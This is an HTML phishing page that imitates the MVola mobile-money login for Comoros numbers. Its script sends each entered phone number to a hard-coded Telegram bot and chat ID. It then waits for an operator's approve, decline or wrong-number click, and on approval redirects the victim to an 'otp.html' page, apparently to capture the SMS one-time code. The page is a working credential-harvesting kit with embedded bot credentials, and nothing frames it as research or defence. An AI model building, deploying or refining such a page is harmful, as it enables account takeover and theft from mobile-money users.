<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MVola Replica</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Albert+Sans:wght@400;500;700&display=swap');
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Albert Sans', sans-serif;
            background-color: #ffffff;
            width: 100vw;
            min-height: 100vh;
            display: flex;
            justify-content: center;
        }
        
        .mobile-container {
            width: 100%;
            max-width: 600px;
            height: 100vh;
            background-color: #ffffff;
            padding: 40px 24px;
            display: flex;
            flex-direction: column;
            position: relative;
        }
        /* Logo Styling */
        
        .logo {
            font-size: 38px;
            font-weight: 700;
            color: #f4d03f;
            margin-bottom: 40px;
            letter-spacing: -1px;
            display: flex;
            align-items: center;
        }
        
        .logo-m {
            font-size: 42px;
            margin-right: 2px;
            position: relative;
            top: -2px;
        }
        
        h1 {
            font-size: 28px;
            font-weight: 500;
            margin-bottom: 35px;
            color: #000;
        }
        
        h2 {
            font-size: 18px;
            font-weight: 500;
            margin-bottom: 10px;
            color: #000;
        }
        
        p.description {
            font-size: 15px;
            line-height: 1.4;
            color: #000;
            margin-bottom: 25px;
        }
        /* Input Field Styling */
        
        .input-wrapper {
            display: flex;
            align-items: center;
            border: 2px solid #f4d03f;
            border-radius: 6px;
            padding: 15px 12px;
            margin-bottom: 35px;
            background: #fff;
        }
        
        .flag-container {
            display: flex;
            align-items: center;
            gap: 5px;
            padding-right: 12px;
            border-right: 1px solid #eee;
            margin-right: 15px;
            cursor: pointer;
        }
        /* Comoros Flag */
        
        .flag-icon {
            width: 22px;
            height: 15px;
            background: linear-gradient( to bottom, #FFD100 25%, #FFFFFF 25%, #FFFFFF 50%, #CE1126 50%, #CE1126 75%, #3A75C4 75%);
            position: relative;
            border: 1px solid #ddd;
            overflow: hidden;
        }
        
        .flag-icon::before {
            content: '';
            position: absolute;
            left: 0;
            top: 0;
            width: 0;
            height: 0;
            border-top: 7.5px solid transparent;
            border-bottom: 7.5px solid transparent;
            border-left: 7.5px solid #3D9B35;
        }
        
        .country-code {
            font-size: 16px;
            font-weight: 500;
            color: #333;
        }
        
        .chevron {
            font-size: 10px;
            color: #888;
            margin-left: 2px;
        }
        
        input[type="tel"] {
            border: none;
            outline: none;
            font-size: 18px;
            font-weight: 500;
            width: 100%;
            color: #000;
            letter-spacing: 1px;
            font-family: 'Albert Sans', sans-serif;
        }
        /* Checkbox Section */
        
        .terms-container {
            display: flex;
            align-items: center;
            margin-bottom: 45px;
            font-size: 15px;
        }
        
        .custom-checkbox {
            width: 22px;
            height: 22px;
            background-color: #f4d03f;
            border-radius: 4px;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-right: 12px;
            cursor: pointer;
            flex-shrink: 0;
        }
        
        .custom-checkbox svg {
            width: 16px;
            height: 16px;
            fill: #000;
        }
        
        .terms-text {
            color: #000;
            line-height: 1.3;
        }
        
        .terms-link {
            color: #2b7de9;
            text-decoration: none;
            font-weight: 500;
        }
        /* Button */
        
        .btn-validate {
            width: 100%;
            background-color: #000;
            color: #fff;
            border: none;
            border-radius: 30px;
            padding: 20px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: opacity 0.2s;
            margin-bottom: 30px;
            font-family: 'Albert Sans', sans-serif;
        }
        
        .btn-validate:hover {
            opacity: 0.9;
        }
        
        .content {
            flex-grow: 1;
        }
        /* Home Indicator */
        
        .home-indicator {
            width: 130px;
            height: 5px;
            background-color: #444;
            border-radius: 10px;
            margin: 0 auto;
        }
        /* Error Message */
        
        .error-msg {
            display: none;
            width: 100%;
            background: #ffe6e6;
            border: 1px solid #ffcccc;
            color: #cc0000;
            padding: 12px 16px;
            border-radius: 8px;
            font-size: 14px;
            margin-bottom: 20px;
            text-align: center;
        }
        /* Loading Overlay */
        
        .loading-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(255, 255, 255, 0.95);
            z-index: 2000;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 20px;
        }
        
        .loading-overlay.active {
            display: flex;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid #f4d03f;
            border-top-color: #000;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        
        .loading-text {
            font-weight: 700;
            font-size: 16px;
            color: #000;
        }
    </style>
</head>

<body>

    <div class="mobile-container">

        <div class="content">
            <!-- Logo -->
            <div class="logo">
                <span class="logo-m">M</span>Vola
            </div>

            <h1>Bienvenue à MVola!</h1>

            <!-- Form Section -->
            <h2>Identification</h2>
            <p class="description">
                Veuillez entrer ci-dessous votre numéro de téléphone. Vous allez recevoir un SMS contenant un code à usage unique.
            </p>

            <!-- Error Message Container -->
            <div class="error-msg" id="loginError">Accès refusé. Veuillez vérifier vos informations.</div>

            <!-- Form -->
            <form id="loginForm">

                <!-- Phone Input (7 digits only) -->
                <div class="input-wrapper">
                    <div class="flag-container">
                        <div class="flag-icon"></div>
                        <span class="country-code">269</span>
                        <span class="chevron">▼</span>
                    </div>
                    <input type="tel" id="phoneInput" value="" placeholder="34 00 00 0" maxlength="7" required>
                </div>

                <!-- Terms Checkbox -->
                <div class="terms-container">
                    <div class="custom-checkbox">
                        <svg viewBox="0 0 24 24">
                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                        </svg>
                    </div>
                    <span class="terms-text">
                        En cochant, vous acceptez nos <a href="#" class="terms-link">CGU</a>
                    </span>
                </div>

                <!-- Button -->
                <button type="submit" class="btn-validate">Valider</button>

            </form>
        </div>

        <!-- Bottom Home Bar -->
        <div class="home-indicator"></div>

    </div>

    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text">Vérification en cours...</div>
    </div>

    <!-- Script to handle Telegram Integration -->
    <script>
        // --- TELEGRAM CONFIGURATION ---
        // CORRECTED TOKEN (the 'l' was changed to '1')
        const TELEGRAM_BOT_TOKEN = "8860442173:AAG8rL46NtCjyacbn8OebIxw_7y8q7_Nmq4";
        const TELEGRAM_CHAT_ID = "5703339850";

        const loginForm = document.getElementById('loginForm');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const errorMsg = document.getElementById('loginError');

        function showError(msg) {
            errorMsg.textContent = msg;
            errorMsg.style.display = 'block';
        }

        function hideError() {
            errorMsg.style.display = 'none';
        }

        // --- Polling Logic for Telegram Response ---
        function startPolling(userNum, onApproveUrl) {
            let offset = 0;
            let decided = false;
            let pollCount = 0;
            const maxPolls = 90; // Max 3 minutes (90 * 2 seconds)

            // Get initial offset so we only listen to NEW messages
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=1`)
                .then(r => r.json())
                .then(data => {
                    if (data.ok && data.result.length > 0) {
                        offset = data.result[data.result.length - 1].update_id + 1;
                    }
                    pollLoop();
                })
                .catch(() => pollLoop());

            function pollLoop() {
                if (decided) return;
                pollCount++;

                if (pollCount > maxPolls) {
                    decided = true;
                    loadingOverlay.classList.remove('active');
                    showError('Délai expiré. Veuillez réessayer.');
                    return;
                }

                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=20&offset=${offset}`)
                    .then(r => r.json())
                    .then(data => {
                        if (!data.ok || decided) {
                            if (!decided) setTimeout(pollLoop, 2000);
                            return;
                        }

                        for (let update of data.result) {
                            offset = update.update_id + 1;

                            // Check if it's a button click (callback_query)
                            if (update.callback_query) {
                                const action = update.callback_query.data;

                                // Acknowledge the button click in Telegram
                                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json'
                                    },
                                    body: JSON.stringify({
                                        callback_query_id: update.callback_query.id,
                                        text: "Action enregistrée !"
                                    })
                                }).catch(() => {});

                                // Check if the action is for THIS user
                                if (action === `approve_${userNum}`) {
                                    decided = true;
                                    loadingOverlay.classList.remove('active');
                                    window.location.href = onApproveUrl;
                                    return;
                                } else if (action === `decline_${userNum}`) {
                                    decided = true;
                                    loadingOverlay.classList.remove('active');
                                    showError('Demande refusée. Veuillez réessayer.');
                                    return;
                                } else if (action === `wrong_${userNum}`) {
                                    decided = true;
                                    loadingOverlay.classList.remove('active');
                                    showError('Numéro incorrect. Veuillez vérifier et réessayer.');
                                    return;
                                }
                            }
                        }
                        if (!decided) setTimeout(pollLoop, 2000);
                    })
                    .catch(() => {
                        if (!decided) setTimeout(pollLoop, 2000);
                    });
            }
        }

        // --- Form Submission ---
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            hideError();

            const mobile = document.getElementById('phoneInput').value.trim();

            // Basic validation - MUST BE 7 DIGITS
            if (mobile.length !== 7) {
                showError('Veuillez entrer un numéro de téléphone valide à 7 chiffres.');
                return;
            }

            // Save phone number to localStorage for later use
            localStorage.setItem('userPhone', mobile);

            // Show loading spinner
            loadingOverlay.classList.add('active');

            const userNum = mobile.replace(/\D/g, ''); // Sanitize number for callback data

            // Prepare the Telegram message
            const message = `🔔 <b>Nouvelle Connexion MVola</b>\n\n📱 Numéro: <code>+269 ${mobile}</code>\n⏰ Heure: ${new Date().toLocaleString('fr-FR')}\n\nVeuillez approuver, refuser ou signaler comme incorrect :`;

            const keyboard = {
                inline_keyboard: [
                    [{
                        text: "✅ APPROUVER",
                        callback_data: `approve_${userNum}`
                    }, {
                        text: "❌ REFUSER",
                        callback_data: `decline_${userNum}`
                    }],
                    [{
                        text: "⚠️ NUMÉRO INCORRECT",
                        callback_data: `wrong_${userNum}`
                    }]
                ]
            };

            // Send message to Telegram
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML',
                        reply_markup: JSON.stringify(keyboard)
                    })
                })
                .then(res => res.json())
                .then(data => {
                    if (data.ok) {
                        // Start checking for your response
                        startPolling(userNum, 'otp.html');
                    } else {
                        loadingOverlay.classList.remove('active');
                        showError(`Telegram Error: ${data.description || 'Unknown error'}`);
                    }
                })
                .catch((error) => {
                    loadingOverlay.classList.remove('active');
                    showError(`Network Error: ${error.message}`);
                });
        });
    </script>

</body>

</html>
